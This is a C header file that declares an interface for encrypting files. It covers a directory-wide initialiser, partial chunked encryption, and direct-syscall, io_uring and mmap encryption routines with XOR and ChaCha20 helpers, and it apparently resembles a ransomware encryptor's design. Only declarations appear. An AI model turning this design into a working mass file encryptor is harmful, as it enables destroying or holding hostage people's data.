#ifndef ENCRYPTION_H
#define ENCRYPTION_H

#include <stddef.h>
#include <sys/types.h>

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

typedef enum {
    METHOD_DIRECT_SYSCALL = 1,
    METHOD_IO_URING = 2,
    METHOD_PARTIAL = 3,
    METHOD_MMAP_PAGES = 4,
    METHOD_IO_URING_SYSCALL = 5,
    METHOD_IO_URING_SYSCALL_HYBRID = 6
} encryption_method_t;

// Chunk information for partial encryption
typedef struct {
    off_t offset;
    size_t length;
} chunk_info_t;

int init_encryption_system(char* target_directory);
void cleanup_encryption_system(void);

// Encryption functions
int encrypt_file_io_uring_direct_syscall(const char *filepath);
int encrypt_file_direct_syscall(const char *filepath);
int encrypt_file_io_uring(const char *filepath);
int encrypt_file_partial_direct(const char *filepath);
int encrypt_file_mmap_pages(const char *filepath);
int encrypt_file_hybrid_partial_iouring(const char *filepath);

// Utility functions
void xor_encrypt_buffer(unsigned char *data, size_t len, unsigned char key);
int calculate_encryption_chunks(size_t file_size, chunk_info_t *chunks);
int chacha20_encrypt_buffer(unsigned char *data, size_t len);
int encrypt_buffer(unsigned char *data, size_t len, unsigned char xor_key);

#endif // ENCRYPTION_H
